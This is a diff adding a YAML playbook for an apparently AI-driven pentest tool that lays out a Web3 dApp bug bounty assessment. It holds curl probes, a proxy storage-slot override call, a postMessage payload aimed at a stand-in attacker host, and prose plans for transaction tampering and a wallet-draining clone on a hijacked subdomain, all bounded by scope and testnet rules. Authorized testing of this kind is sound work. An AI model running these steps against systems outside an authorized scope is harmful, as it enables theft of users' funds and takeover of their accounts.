@@ -1,0 +1,447 @@
+# ============================================================================
+#  web3-dapp-bugbounty.yaml
+#  Advanced Web3 / dApp Bug Bounty Playbook for pentest-ai (ptai)
+#  -------------------------------------------------------------
+#  Derived from: "Advanced Web3 Application Security and Bug Bounty Playbook"
+#  Target scope: dApp frontends (Web2.5 / API-less), RPC infra, subgraphs,
+#                IPFS/Arweave deployments, OAuth + Web3Auth flows, supply chain.
+#  Severity model: Immunefi V2.3 ("Primacy of Impact").
+#  Run:    ptai playbook run ./playbooks/web3-dapp-bugbounty.yaml
+#  CI:     see .github/workflows/web3-security.yml
+# ============================================================================
+
+name: web3-dapp-bugbounty
+version: "1.0.0"
+description: >
+  End-to-end Web3 dApp assessment: client-side trust boundary, RPC
+  misconfig + Tenderly fork detection, subgraph introspection, IPFS/Arweave
+  CID extraction, transaction-parameter tampering, subdomain takeover
+  weaponization (cookie bombing + malicious wallet), supply chain audit,
+  and Immunefi-grade PoC capture.
+
+# ----------------------------------------------------------------------------
+#  INPUTS
+# ----------------------------------------------------------------------------
+inputs:
+  target:
+    required: true
+    prompt: "Primary dApp URL (e.g. https://app.protocol.com)"
+  root_domain:
+    required: true
+    prompt: "Root domain for subdomain enum (e.g. protocol.com)"
+  chain_ids:
+    required: false
+    default: ["1", "10", "137", "8453", "42161"]
+    prompt: "EVM Chain IDs to fuzz against RPC endpoints"
+  bounty_program:
+    required: false
+    prompt: "Bounty program slug on Immunefi/HackerOne (for scope check)"
+  in_scope_assets:
+    required: true
+    prompt: "Comma-separated in-scope hosts/CIDRs (program scope file)"
+  oauth_providers:
+    required: false
+    default: ["google", "github", "web3auth", "magic"]
+    prompt: "Third-party identity providers integrated by the dApp"
+
+# ----------------------------------------------------------------------------
+#  GLOBAL OPTIONS
+# ----------------------------------------------------------------------------
+options:
+  hitl: true                 # human-in-the-loop avant tout exploit actif
+  fail_on: high              # CI gate severity
+  poc_isolation: testnet     # JAMAIS de mainnet state-changing
+  rate_limit_rps: 10
+  respect_robots: false      # bug bounty programs override robots.txt scope
+
+# ----------------------------------------------------------------------------
+#  PHASES
+# ----------------------------------------------------------------------------
+phases:
+
+  # ==========================================================================
+  #  PHASE 1 - Asset Discovery & Permutation (NahamSec methodology)
+  # ==========================================================================
+  - id: recon-assets
+    description: "Map the full attack surface before touching the dApp."
+    tools: [subfinder, amass, assetfinder, findomain, massdns, dnsgen, altdns]
+    inputs:
+      domain: "{{ inputs.root_domain }}"
+    outputs:
+      - live_subdomains
+      - dns_records
+    success_criteria:
+      min_subdomains: 5
+    notes: |
+      Aggregate baseline from passive sources, then permute with dnsgen/altdns
+      and resolve at scale via massdns. Watch for *.staging.*, *.dev.*, rpc.*,
+      subgraph.*, ipfs.*, gateway.*, api.* — these are the high-value targets.
+
+  # ==========================================================================
+  #  PHASE 2 - Live Probe + Historical Content Discovery
+  # ==========================================================================
+  - id: recon-content
+    depends_on: [recon-assets]
+    tools: [httpx, ffuf, gau, waybackurls]
+    inputs:
+      hosts: "{{ phases.recon-assets.outputs.live_subdomains }}"
+    outputs:
+      - live_endpoints
+      - historical_urls
+      - tech_fingerprints
+    notes: |
+      Wayback + gau routinely surface deprecated API versions still online
+      without modern authz. Flag /v1/, /api/legacy/, /admin/, /__internal/.
+
+  # ==========================================================================
+  #  PHASE 3 - JavaScript Dissection & Secret Extraction (Frans Rosen + NahamSec)
+  # ==========================================================================
+  - id: js-analysis
+    depends_on: [recon-content]
+    tools: [linkfinder, trufflehog, gitleaks, jsluice]
+    inputs:
+      urls: "{{ phases.recon-content.outputs.live_endpoints }}"
+    outputs:
+      - hidden_endpoints
+      - leaked_secrets
+      - postmessage_listeners
+      - oauth_configs
+    llm_decide: true
+    notes: |
+      Parse every bundle. Look specifically for:
+        - window.addEventListener('message', ...) without origin check
+        - eth_requestAccounts / eth_sendTransaction wrappers
+        - hardcoded RPC URLs + API keys (Alchemy, Infura, QuickNode)
+        - OAuth client_id + redirect_uri + response_type config
+        - Web3Auth / Magic SDK init params (custodial key derivation)
+
+  # ==========================================================================
+  #  PHASE 4 - Web2.5 Application Layer (Jason Haddix tactical fuzzing)
+  # ==========================================================================
+  - id: web-app
+    depends_on: [recon-content]
+    tools: [nuclei, ffuf, dalfox, xsstrike, sqlmap, ssrfmap, jwt_tool]
+    inputs:
+      target: "{{ inputs.target }}"
+      endpoints: "{{ phases.js-analysis.outputs.hidden_endpoints }}"
+    outputs:
+      - web_findings
+    success_criteria:
+      coverage: ["xss", "sqli", "ssrf", "idor", "xxe", "auth_bypass"]
+    notes: |
+      Heat-map content types: upload endpoints -> XXE; export endpoints ->
+      SSRF; profile endpoints -> IDOR; admin panels -> auth bypass.
+      Web2.5 backends indexing on-chain data are the soft underbelly.
+
+  # ==========================================================================
+  #  PHASE 5 - RPC Endpoint Misconfiguration (Web3-specific recon)
+  # ==========================================================================
+  - id: rpc-fuzz
+    depends_on: [recon-assets]
+    condition: "any_finding(type='subdomain', value~='rpc.*|node.*|chain.*')"
+    custom_commands:
+      # Probe root + chain-id path bypass for each candidate RPC host
+      - name: rpc-chainid-bypass
+        run: |
+          for host in {{ rpc_candidates }}; do
+            for cid in {{ inputs.chain_ids | join(' ') }}; do
+              curl -sk -m 5 -X POST "https://${host}/${cid}" \
+                -H "Content-Type: application/json" \
+                -d '{"jsonrpc":"2.0","method":"web3_clientVersion","id":1,"params":[]}' \
+                -o "out/rpc_${host}_${cid}.json"
+            done
+          done
+    outputs:
+      - exposed_rpc_nodes
+      - client_versions
+    notes: |
+      403 at root + 200 at /1 (mainnet), /137 (polygon), etc. = firewall
+      bypass. web3_clientVersion fingerprint reveals geth, erigon, nethermind,
+      OR — jackpot — "Tenderly/1.0" indicating an exposed simulation fork.
+
+  # ==========================================================================
+  #  PHASE 6 - Tenderly / Simulation Fork Weaponization
+  # ==========================================================================
+  - id: rpc-fork-exploit
+    depends_on: [rpc-fuzz]
+    requires_finding:
+      type: rpc_client_version
+      match: "Tenderly|Hardhat|Anvil|Ganache"
+    llm_decide: true
+    custom_commands:
+      # 1. Cross-reference internal balance vs public mainnet
+      - name: balance-divergence-check
+        run: |
+          curl -sk "https://${TARGET_RPC}" -X POST \
+            -d '{"jsonrpc":"2.0","method":"eth_getBalance","params":["{{ vault_addr }}","latest"],"id":1}'
+      # 2. State override PoC — overwrite EIP-1967 logic slot (NON-DESTRUCTIVE READ)
+      - name: state-override-poc
+        run: |
+          curl -sk "https://${TARGET_RPC}" -X POST \
+            -d '{
+              "jsonrpc":"2.0","id":1,"method":"eth_call",
+              "params":[
+                {"to":"{{ proxy_addr }}","data":"0x"},
+                "latest",
+                {"{{ proxy_addr }}":{"stateDiff":{
+                   "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc":
+                   "0x000000000000000000000000DEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEF"
+                }}}
+              ]
+            }'
+    outputs:
+      - balance_divergence
+      - state_override_proof
+    severity_target: critical
+    notes: |
+      Document: (a) balance hallucination vs Etherscan; (b) successful
+      stateDiff override of EIP-1967 logic slot; (c) ability to simulate
+      unreleased contract upgrades. DO NOT submit destructive simulations.
+
+  # ==========================================================================
+  #  PHASE 7 - Subgraph (The Graph) Introspection
+  # ==========================================================================
+  - id: subgraph-introspect
+    depends_on: [js-analysis]
+    condition: "any_finding(type='endpoint', value~='subgraph|graphql|thegraph')"
+    custom_commands:
+      - name: graphql-introspection
+        run: |
+          curl -sk "${SUBGRAPH_URL}" -X POST \
+            -H "Content-Type: application/json" \
+            -d '{"query":"query IntrospectionQuery { __schema { queryType { name } mutationType { name } types { name kind fields { name } } } }"}'
+    outputs:
+      - subgraph_schema
+      - hidden_mutations
+    notes: |
+      Hidden mutations on a public subgraph = catastrophic. Off-chain user
+      data dumps, NFT metadata tampering, oracle feed manipulation.
+
+  # ==========================================================================
+  #  PHASE 8 - IPFS / Arweave Deployment Mining
+  # ==========================================================================
+  - id: decentralized-storage
+    depends_on: [js-analysis]
+    llm_decide: true
+    custom_commands:
+      - name: cid-extraction
+        run: |
+          # Extract CIDs from page source + JS bundles
+          grep -rohE '(Qm[1-9A-HJ-NP-Za-km-z]{44}|bafy[0-9a-z]{50,})' out/js/ | sort -u
+      - name: arweave-tx-mine
+        run: |
+          # Pull every Arweave tx referenced in frontend
+          grep -rohE '[a-zA-Z0-9_-]{43}' out/js/ | xargs -I{} curl -sk "https://arweave.net/{}"
+    outputs:
+      - cid_inventory
+      - legacy_builds
+    notes: |
+      Older deploy CIDs are immutable AND unerasable. Hardcoded admin
+      keys, unminified source, .env files in the build artifacts persist
+      forever. This is one of the highest ROI Web3-specific phases.
+
+  # ==========================================================================
+  #  PHASE 9 - postMessage / Cross-Origin Exploitation (Frans Rosen)
+  # ==========================================================================
+  - id: postmessage-xss
+    depends_on: [js-analysis]
+    requires_finding:
+      type: postmessage_listener
+      attribute: origin_check
+      match: "absent|wildcard|startsWith"
+    llm_decide: true
+    outputs:
+      - postmessage_pocs
+    severity_target: high
+    notes: |
+      For each listener with weak origin validation, build an iframe-based
+      PoC that posts a payload like:
+        at-share-bookmarklet://ATTACKERHOST/xss.js
+      Document alert(document.domain) execution + ability to call the
+      window.ethereum provider from injected context.
+
+  # ==========================================================================
+  #  PHASE 10 - OAuth "Dirty Dancing" + Web3Auth Account Takeover
+  # ==========================================================================
+  - id: oauth-dirtydancing
+    depends_on: [js-analysis]
+    requires_finding:
+      type: oauth_config
+    llm_decide: true
+    custom_commands:
+      # Test response_type switching, redirect_uri quirks, state desync
+      - name: response-type-switch
+        run: |
+          # code -> token, token -> id_token, etc.
+          for rt in "code" "token" "id_token" "code id_token" "code token"; do
+            curl -sk "${AUTH_URL}?response_type=${rt}&client_id=${CID}&redirect_uri=${RURI}"
+          done
+    outputs:
+      - oauth_takeovers
+    severity_target: critical
+    notes: |
+      In Web3Auth/Magic flows, authorization code leak == custodial wallet
+      takeover == direct fund theft (Critical, zero-interaction-class).
+
+  # ==========================================================================
+  #  PHASE 11 - Transaction Parameter Tampering (Trust Boundary Breach)
+  # ==========================================================================
+  - id: tx-param-tampering
+    depends_on: [web-app, postmessage-xss]
+    condition: "any_finding(severity>='medium', type~='xss|prototype_pollution|dom_clobber')"
+    llm_decide: true
+    outputs:
+      - tx_tamper_pocs
+    severity_target: critical
+    notes: |
+      Given XSS/DOM-clobbering primitive, override window.ethereum.request
+      to mutate eth_sendTransaction params:
+        - swap `to` -> attacker EOA
+        - inflate ERC-20 approve(spender, amount=2^256-1)
+        - swap function selector
+      PoC must run on TESTNET ONLY (Sepolia/Holesky/Mumbai).
+      This is the Bybit-class vector — Critical capped per program TVL.
+
+  # ==========================================================================
+  #  PHASE 12 - Supply Chain & Bundler Audit
+  # ==========================================================================
+  - id: supply-chain
+    depends_on: [recon-content]
+    tools: [trufflehog, gitleaks, retirejs, npm-audit]
+    custom_commands:
+      - name: package-tree-audit
+        run: |
+          # If package.json is exposed (often via .git or sourcemaps)
+          curl -sk "${TARGET}/package.json" -o pkg.json && \
+            npm audit --package-lock-only --json
+      - name: sri-check
+        run: |
+          # Verify Subresource Integrity hashes on all <script src>
+          curl -sk "${TARGET}" | grep -oE '<script[^>]+src="[^"]+"[^>]*>'
+    outputs:
+      - vulnerable_deps
+      - missing_sri
+      - cdn_dependencies
+    notes: |
+      A single compromised npm package or unpinned CDN script = every user
+      drained on next deploy. Bybit lesson: build-time injection bypasses
+      runtime security. Flag every <script> without integrity= hash.
+
+  # ==========================================================================
+  #  PHASE 13 - Subdomain Takeover Hunt
+  # ==========================================================================
+  - id: subtakeover-hunt
+    depends_on: [recon-assets]
+    tools: [subjack, nuclei]
+    custom_commands:
+      - name: dangling-cname-scan
+        run: |
+          for sub in {{ phases.recon-assets.outputs.live_subdomains }}; do
+            dig +short CNAME "${sub}" | grep -E 's3|github\.io|herokuapp|azurewebsites|netlify|vercel|fastly'
+          done
+    outputs:
+      - takeover_candidates
+    notes: |
+      Dangling CNAMEs to S3, GitHub Pages, Heroku, Netlify, Vercel are the
+      classic takeover surface. Out-of-scope ALONE on Immunefi.
+
+  # ==========================================================================
+  #  PHASE 14 - Subdomain Takeover WEAPONIZATION (chain to Critical)
+  # ==========================================================================
+  - id: subtakeover-weaponize
+    depends_on: [subtakeover-hunt]
+    requires_finding:
+      type: subdomain_takeover
+    llm_decide: true
+    hitl: true
+    outputs:
+      - cookie_bomb_poc       # DoS - Medium
+      - malicious_wallet_poc  # Direct theft - Critical
+    notes: |
+      Two parallel PoCs to maximize payout:
+        1. COOKIE BOMBING: 100+ cookies @ ~4000 chars each, scoped to
+           .{{ inputs.root_domain }}, force 431/413 on the main app.
+        2. MALICIOUS dApp: Deploy a clone on the hijacked subdomain,
+           call eth_requestAccounts on visit, then eth_sendTransaction
+           draining native + max-approve ERC-20s. Wallet UI shows the
+           legitimate-looking domain — that's the entire exploit.
+      Document the FULL chain in the report — without weaponization,
+      Immunefi triages this as Not Applicable.
+
+  # ==========================================================================
+  #  PHASE 15 - Exploit Chaining & Attack Path Discovery
+  # ==========================================================================
+  - id: chain-discovery
+    depends_on:
+      - web-app
+      - postmessage-xss
+      - oauth-dirtydancing
+      - tx-param-tampering
+      - subtakeover-weaponize
+    tools: [exploit-chain]   # native ptai agent
+    outputs:
+      - attack_paths
+    notes: |
+      Let the chaining engine connect medium findings into Critical paths.
+      Example: leaked Alchemy key (js-analysis) + open subgraph mutation
+      (subgraph-introspect) + reflected XSS (web-app) -> oracle manipulation
+      via authenticated admin dashboard.
+
+  # ==========================================================================
+  #  PHASE 16 - PoC Validation (non-destructive)
+  # ==========================================================================
+  - id: poc-validate
+    depends_on: [chain-discovery]
+    tools: [poc-validator]
+    inputs:
+      isolation: "{{ options.poc_isolation }}"
+    outputs:
+      - validated_pocs
+    notes: |
+      Every Critical/High needs an irrefutable PoC. Hardhat/Anvil fork for
+      tx tampering. Iframe HTML for postMessage. cURL chains for OAuth.
+      Mainnet state mutation = INSTANT DISQUALIFICATION + legal exposure.
+
+  # ==========================================================================
+  #  PHASE 17 - Severity Classification (Immunefi V2.3) + Report
+  # ==========================================================================
+  - id: report
+    depends_on: [poc-validate]
+    tools: [report-generator]
+    inputs:
+      framework: immunefi-v2.3
+      bounty_program: "{{ inputs.bounty_program }}"
+    outputs:
+      - sarif
+      - markdown_report
+      - immunefi_submission
+    notes: |
+      Apply "Primacy of Impact":
+        - Critical: zero-interaction loss of funds OR private key leak
+        - High:     stored XSS -> tx tamper, weaponized subtakeover
+        - Medium:   cookie bombing DoS, non-financial ATO
+        - Low:      missing headers, open redirects
+      Cap at 10% TVL for smart-contract-adjacent infra findings.
+      Include KYC-ready writeup format for instant payout.
+
+# ----------------------------------------------------------------------------
+#  CI GATES
+# ----------------------------------------------------------------------------
+ci:
+  fail_on: high
+  sarif_output: pentest.sarif
+  pr_comment: true
+  scope_enforcement: strict       # any out-of-scope hit = abort
+  block_destructive: true         # hard-block any mainnet write op
+
+# ----------------------------------------------------------------------------
+#  SCOPE GUARDS
+# ----------------------------------------------------------------------------
+scope:
+  allowed_targets: "{{ inputs.in_scope_assets }}"
+  excluded_targets:
+    - "*.thirdparty-saas.com"     # never test SaaS provider infra
+  excluded_methods:
+    - mainnet_state_mutation
+    - real_user_phishing
+    - destructive_dos_in_prod
